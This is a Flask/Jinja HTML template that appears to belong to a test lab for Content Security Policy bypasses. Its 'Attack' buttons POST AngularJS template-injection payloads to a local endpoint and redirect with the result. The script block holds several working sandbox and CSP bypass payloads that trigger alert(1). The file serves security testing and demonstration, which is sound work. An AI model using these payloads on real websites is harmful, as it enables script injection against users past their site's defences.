<html>
  <head>
    <script src="{{ url_for('static', filename='tools/axios.min.js') }}"></script>
  </head>
  <body>
    <iframe src="{{url_for('csp.csp', name=name)}}"> 
    </iframe>
    <!-- <button onclick='window.location.href="http://localhost:5000/csp/angularjs-ue1.html?inj=123"'>Attack</button> -->
    <button onclick="attack()">Attack</button>
    {% if name == "angularjs-dis-ue-ui.html" %}
    <button onclick="attack2()">Attack 2</button>
    {% endif %}
     <!-- Get attack code -->
     <script>
        // let url = window.location.protocol + '//' + window.location.host;
        {% if name == "angularjs-dis-ue-ui.html" %}
            payload = "{% raw %}<div ng-app><div>Click the Input Box</div><input id='example' ng-click=$event.path|orderBy:'alert(1)'></div>{% endraw %}";
            payload2 = '{% raw %}<div ng-app ng-csp><div ng-focus="x=$event" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if=key=="window">{{ value.alert = [1].reduce(value.alert, 1) }}</div></div></div>{% endraw %}';
        {% else %}
            payload = "{% raw %}<div ng-app>{{''.constructor.constructor('alert(1)')()}}</div>{% endraw %}";
        {% endif %}
        const attack = () => {
            let url = window.location.href;
            url = url.substring(0, url.lastIndexOf('/'));
            url = url.substring(0, url.lastIndexOf('/'));
            url = url + "/{{ name }}";
            axios.post(url, {
                payload: payload
              })
              .then(function (response) {
                console.log(response.data);
                console.log(url+"?inj="+response.data);
                window.location.replace(url+"?inj="+response.data);
              })
              .catch(function (error) {
                console.log(error);
              });
        }
        const attack2 = () => {
            let url = window.location.href;
            url = url.substring(0, url.lastIndexOf('/'));
            url = url.substring(0, url.lastIndexOf('/'));
            url = url + "/{{ name }}";
            axios.post(url, {
                payload: payload2
              })
              .then(function (response) {
                console.log(response.data);
                console.log(url+"?inj="+response.data);
                window.location.replace(url+"?inj="+response.data);
              })
              .catch(function (error) {
                console.log(error);
              });
        }
      </script>
  </body>
</html>



